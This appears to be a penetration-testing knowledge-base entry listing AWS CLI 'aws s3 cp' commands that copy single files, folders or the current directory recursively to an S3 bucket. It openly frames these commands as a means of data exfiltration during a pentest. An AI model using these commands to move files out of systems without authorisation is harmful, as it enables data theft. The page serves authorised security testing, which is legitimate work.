---
id: 6630f8a0-7661-48df-b597-7a9bb960ad5b
name: AWS Copy Files / Folder to S3 Bucket
type: procedure
verified: false
submitted: false
created_at: '2020-07-31T04:25:22.690274+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
commands:
- '[[aws s3 copy current folder contents to bucket recursively]]'
- '[[aws s3 copy files to bucket]]'
- '[[aws s3 copy files to bucket folder]]'
- '[[aws s3 copy folder to bucket recursively]]'
---

# AWS Copy Files / Folder to S3 Bucket

## Summary

Copying files & folders to or from an S3 bucket can be very useful. This can be used for Data Exfiltration, or just moving files around during a pentest. Both sets of instructions below can be done in reverse to copy files or folders FROM an s3 bucket just reverse the $FILE for $S3_BUCKET. 

## Description

# Description

Copying files & folders to or from an S3 bucket can be very useful. This can be used for Data Exfiltration, or just moving files around during a pentest.

Both sets of instructions below can be done in reverse to copy files or folders FROM an s3 bucket just reverse the $FILE for $S3_BUCKET.

##  Instructions

1. Copy a specific file to a s3 bucket



**Command** ([[aws s3 copy files to bucket]]):

```bash
aws s3 cp $FILE s3://$AWS_S3_BUCKET

```





aws s3 cp <file_name> s3://<bucket_name>

2. Copy a specific file to a s3 bucket folder



**Command** ([[aws s3 copy files to bucket folder]]):

```bash
aws s3 cp $FILE s3://$AWS_S3_BUCKET/$FOLDER/

```





aws s3 cp <file_name> s3://<bucket_name>/<folder_name>/

3. (Optional) Copy a folder to a bucket recursively



**Command** ([[aws s3 copy folder to bucket recursively]]):

```bash
aws s3 cp $FOLDER s3://$AWS_S3_BUCKET/ --recursive

```





aws s3 cp . s3://redstack.io-bucket/ --recursive

4. (Optional) Copy the current folder concents to a S3 bucket



**Command** ([[aws s3 copy current folder contents to bucket recursively]]):

```bash
aws s3 cp . s3://$AWS_S3_BUCKET/$FOLDER --recursive --region $AWS_REGION

```





aws s3 cp . s3://redstack.io-bucket/images --recursive --region us-east-1

## Commands Used

- [[aws s3 copy current folder contents to bucket recursively]]
- [[aws s3 copy files to bucket]]
- [[aws s3 copy files to bucket folder]]
- [[aws s3 copy folder to bucket recursively]]


